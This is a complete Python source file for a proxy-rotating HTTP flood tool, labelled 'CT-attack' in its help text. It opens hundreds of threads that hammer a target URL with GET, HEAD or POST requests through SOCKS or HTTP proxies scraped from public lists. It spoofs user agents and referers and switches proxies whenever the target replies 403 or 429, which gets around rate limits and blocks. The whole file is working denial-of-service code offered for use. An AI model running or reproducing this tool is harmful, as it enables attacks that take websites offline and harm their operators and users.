#!/usr/bin/python3
import signal
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import json

from urllib import request

print ('''
	    CCCCCC// /////CCC/////
	  CC/////       /CCC//
	 CC/           /CCC//
	 CC/          /CCC//
	 CC/////     /CCC//
	  CCCCC/    /CCC//
''')

with open("user_agents.json", "r", encoding="utf-8") as agents:
    arr_useragents = json.load(agents)["agents"]

with open("referers.json", "r", encoding="utf-8") as referer:
    arr_referers = json.load(referer)["referers"]
    

######### Default value ########
mode = "cc"
url = ""
proxy_ver = "5"
brute = False
check_view = False
query = 1
out_file = "proxy.txt"
thread_num = 800
data = ""
cookies = ""
proxies = []
###############################
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
# letters = string.ascii_lowercase
# print ( ''.join(random.choice(strings) for i in range(10)) )
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def die(message):
    sys.exit(message) # internally raises SystemExit
###################################################
def signal_handler(signum, frame):
    print('You pressed Ctrl+C!')
    signal.signal(signum, signal.SIG_IGN) # ignore additional signals
    sys.exit(0)
###################################################
def removeList(ip):
	global out_file
	global proxies
	if ip in proxies:
		proxies.remove(ip)

	if len(proxies) == 0:
		DownloadProxies(proxy_ver)
		proxies = open(out_file).readlines()	
		check_list(out_file)
		proxies = open(out_file).readlines()
		if len(proxies) == 0:
			print("> There are no more proxies. Please download a new proxies list.")
			return
		print ("> Number Of Proxies: %d" %(len(proxies)))
		if check_proxies:
			check_socks(3)
		proxies = open(out_file).readlines()
	return proxies
###################################################
def build_threads(mode,thread_num,event,proxy_type):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target = post,args=(event,proxy_type,))
			th.daemon = True
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,proxy_type,))
			th.daemon = True
			th.start()
	elif mode == "get":
		for _ in range(thread_num):
			th = threading.Thread(target = get,args=(event,proxy_type,))
			th.daemon = True
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target = head,args=(event,proxy_type,))
			th.daemon = True
			th.start()
			
def randomurl():
	return str(''.join(random.choice(strings) for i in range(10))) #str(Intn(0,271400281257))#less random, more performance

def GenReqHeader(method):
	global path
	global target
	global cookies
	global arr_referers
	global arr_useragents
	global data
	if not path:
		path = "/"
	header = ""
	if method == "get":
		get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		referer = "Referer: "+ Choice(arr_referers) + target + path + "\r\n"
		useragent = "User-Agent: " + Choice(arr_useragents) + "\r\n"
		header = get_host + referer + useragent  + connection + "\r\n"
	elif method == "head":
		get_host = "HEAD " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		connection = "Connection: Keep-Alive\r\n"
		if cookies != "":
			connection += "Cookies: "+str(cookies)+"\r\n"
		referer = "Referer: "+ Choice(arr_referers) + target + path + "\r\n"
		useragent = "User-Agent: " + Choice(arr_useragents) + "\r\n"
		header = get_host + referer + useragent  + connection + "\r\n"
	elif method == "post":
		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
		refer = "Referer: "+ Choice(arr_referers) + target + path + "\r\n"
		user_agent = "User-Agent: " + Choice(arr_useragents) + "\r\n"
		if data == "":# You can enable customize data
			data = str(random._urandom(16))
		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
		if cookies != "":
			length += "Cookies: "+str(cookies)+"\r\n"
		header = post_host + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	return header

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	else:
		print("> That looks like not a correct url.")
		exit()
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Please enter the correct option")
			ans = ""
			continue
	return ans

def cc(event,proxy_type):
	global query
	global check_view
	global proxies
	header = GenReqHeader("get")
	proxy_select = Choice(proxies).strip()
	proxy = proxy_select.strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	elif query == 2:
		add = "/"

	if query == 1 and (add == "?" or add == "&"):
		add = add +"_="
	

	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(3)
			s.connect((str(target), int(port)))
			if protocol == "https":
				#ctx = ssl.SSLContext()
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				ctx.load_default_certs()		
				#ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					#get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
					request = header # get_host + header
					sent = s.send(str.encode(request))
					response = s.recv(128).decode('utf-8', 'ignore')
					response_code = response.split()[1]
					if check_view:
						print( proxy_select  + " = {}".format(response.splitlines()[0]))
					if not sent or str(response_code) == '403' or str(response_code) == '429':
						proxy_select = Choice(proxies).strip()
						proxy = proxy_select.strip().split(":")
						break
				#s.setsockopt(socket.SO_LINGER,0)
				s.close()
			except:
				s.close()
		except:
			if check_view:
				print("Error: "+ proxy_select + " - Count: "+ str(len(proxies)))
			s.close()
			removeList(proxy_select)

def head(event,proxy_type):#HEAD MODE
	global query
	global check_view
	header = GenReqHeader("head")
	proxy_select = Choice(proxies).strip()
	proxy = proxy_select.strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	elif query == 2:
		add = "/"
		

	if query == 1 and (add == "?" or add == "&"):
		add = add +"_="
		
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				#ctx = ssl.SSLContext()
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				ctx.load_default_certs()
				#ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					#head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = header #head_host + header
					sent = s.send(str.encode(request))
					response = s.recv(128).decode('utf-8', 'ignore')
					response_code = response.split()[1]
					if check_view:
						print( proxy_select  + " = {}".format(response.splitlines()[0]))
					if not sent or str(response_code) == '403' or str(response_code) == '429':
						proxy_select = Choice(proxies).strip()
						proxy = proxy_select.strip().split(":")
						break
				s.close()
			except:
				s.close()
		except:#dirty fix
			if check_view:
				print("Error: "+  str(proxy[0]) +":"+ str(proxy[1])+ " - Count: "+ str(len(proxies)))
			removeList(proxy_select)
			s.close()
def post(event,proxy_type):
	global check_view
	header = GenReqHeader("post")
	proxy_select = Choice(proxies).strip()
	proxy = proxy_select.strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	elif query == 2:
		add = "/"

	if query == 1 and (add == "?" or add == "&"):
		add = add +"_="
		
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				#ctx = ssl.SSLContext()
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				ctx.load_default_certs()
				#ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					request = header
					sent = s.send(str.encode(request))
					response = s.recv(128).decode('utf-8', 'ignore')
					response_code = response.split()[1]
					if check_view:
						print( proxy_select  + " = {}".format(response.splitlines()[0]))
					if not sent or str(response_code) == '403' or str(response_code) == '429':
						proxy_select = Choice(proxies).strip()
						proxy = proxy_select.strip().split(":")
						break
				s.close()
			except:
				s.close()
		except:
			if check_view:
				print("Error: "+  str(proxy[0]) +":"+ str(proxy[1])+ " - Count: "+ str(len(proxies)))
			removeList(proxy_select)
			s.close()
def get(event,proxy_type):
	global query
	global check_view
	global proxies
	header = GenReqHeader("get")
	proxy_select = Choice(proxies).strip()
	proxy = proxy_select.strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	elif query == 2:
		add = "/"

	if query == 1 and (add == "?" or add == "&"):
		add = add +"_="
	
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.settimeout(3)
			s.connect((str(target), int(port)))
			if protocol == "https":
				#ctx = ssl.SSLContext()
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				ctx.load_default_certs()		
				#ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					#get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
					request = header # get_host + header
					sent = s.send(str.encode(request))
					response = s.recv(128).decode('utf-8', 'ignore')
					response_code = response.split()[1]
					if check_view:
						print( proxy_select  + " = {}".format(response.splitlines()[0]))
					if not sent or str(response_code) == '403' or str(response_code) == '429':
						proxy_select = Choice(proxies).strip()
						proxy = proxy_select.strip().split(":")
						break
				#s.setsockopt(socket.SO_LINGER,0)
				s.close()
				print( str(proxy[0]) +":"+ str(proxy[1]))
			except:
				s.close()
		except:
			if check_view:
				print("Error Con: "+  str(proxy[0]) +":"+ str(proxy[1])+ " - Count: "+ str(len(proxies)))
			s.close()
			removeList(proxy_select)
nums = 0
def checking(lines,proxy_type,ms,rlock,):
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect(("1.1.1.1", 80))
			'''
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)'''
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if proxy_ver == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if proxy_ver == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		if proxy_ver == "http":
			th = threading.Thread(target=checking,args=(lines,0,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
	#if ans == "y" or ans == "":
	with open(out_file, 'wb') as fp:
		for lines in list(proxies):
			fp.write(bytes(lines,encoding='utf8'))
		fp.close()
	print("> They are saved in "+out_file)
			
def check_list(socks_file):
	print("> Checking list")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i and '#' not in i:
				try:
					socket.inet_pton(socket.AF_INET,i.strip().split(":")[0])#check valid ip v4
					temp_list.append(i)
				except:
					pass
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def DownloadProxies(proxy_ver):
	if proxy_ver == "4":
		f = open(out_file,'wb')
		socks4_api = [
			#"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			#"https://openproxy.space/list/socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			#"https://spys.me/socks.txt",
			#"https://www.freeproxychecker.com/result/socks4_proxies.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",
		]
		for api in socks4_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				fd = open(out_file,"a")
				fd.write(proxies)
				fd.close()
		except:
			pass
	if proxy_ver == "5":
		f = open(out_file,'wb')
		socks5_api = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			#"https://www.freeproxychecker.com/result/socks5_proxies.txt",
			#http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			#"https://openproxy.space/list/socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
			#"https://spys.me/socks.txt",
			#"http://www.socks24.org/feeds/posts/default"",
		]
		for api in socks5_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
	if proxy_ver == "http":
		f = open(out_file,'wb')
		http_api = [
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			#"https://www.freeproxychecker.com/result/http_proxies.txt",
			#"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			#"https://openproxy.space/list/http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			#"https://spys.me/proxy.txt",
			"https://www.proxy-list.download/api/v1/get?type=https",
		]
		for api in http_api:
			try:
				r = requests.get(api,timeout=5)
				f.write(r.content)
			except:
				pass
		f.close()
	print("> Have already downloaded proxies list as "+out_file)

def PrintHelp():
	print('''===============  CT-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
   -show     | show proxies
   -q 	     | query 0 = /?{query} 1 = /?_={query} 2= /{query}
=====================================================''')


def main():
	global proxy_ver
	global data
	global cookies
	global brute
	global url
	global out_file
	global thread_num
	global mode
	global target
	global proxies
	global check_view
	global query
	target = ""
	check_proxies = False
	check_view = False
	download_socks = False
	proxy_type = 5
	period = 60
	help = False
	print("> Mode: [cc/post/head/get]")#slow]")
	for n,args in enumerate(sys.argv):
		if args == "-help" or args =="-h":
			help =True
		if args=="-url":
			ParseUrl(sys.argv[n+1])
		if args=="-m" or args=="-mode":
			mode = sys.argv[n+1]
			if mode not in ["cc","post","head","get"]:#,"slow"]:
				print("> -m/-mode argument error")
				return
		if args =="-v":
			proxy_ver = sys.argv[n+1]
			if proxy_ver == "4":
				proxy_type = 4
			elif proxy_ver == "5":
				proxy_type = 5
			elif proxy_ver == "http":
				proxy_type = 0
			elif proxy_ver not in ["4","5","http"]:
				print("> -v argument error (only 4/5/http)")
				return
		if args == "-b":
			if sys.argv[n+1] == "1":
				brute = True
			elif sys.argv[n+1] == "0":
				brute = False
			else:
				print("> -b argument error")
				return
		if args == "-q":
			if sys.argv[n+1] == "1": # /?_={query}
				query = 1
			elif sys.argv[n+1] == "2": # /{query}
				query = 2
			else: # /?{query}
				query = 0		
		if args == "-t":
			try:
				thread_num = int(sys.argv[n+1])
			except:
				print("> -t must be integer")
				return
		if args == "-cookies":
			cookies = sys.argv[n+1]
		if args == "-data":
			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
		if args == "-f":
			out_file = sys.argv[n+1]
		if args == "-down":
			download_socks=True
		if args == "-check":
			check_proxies = True
		if args == "-show":
			check_view = True
		if args == "-s":
			try:
				period = int(sys.argv[n+1])
			except:
				print("> -s must be integer")
				return

	if download_socks:
		DownloadProxies(proxy_ver)

	if os.path.exists(out_file)!=True:
		print("Proxies file not found")
		return
	proxies = open(out_file).readlines()	
	check_list(out_file)
	proxies = open(out_file).readlines()
	if len(proxies) == 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return
	print ("> Number Of Proxies: %d" %(len(proxies)))
	if check_proxies:
		check_socks(3)

	proxies = open(out_file).readlines()
	if help:
		PrintHelp()

	if target == "":
		print("> There is no target. End of process ")
		return
	event = threading.Event()
	print("> Building threads...")
	build_threads(mode,thread_num,event,proxy_type)
	event.clear()
	#input("Press Enter to continue.")
	event.set()
	print("> Flooding...")
	time.sleep(period)

if __name__ == "__main__":
	signal.signal(signal.SIGINT, signal_handler)
	main()
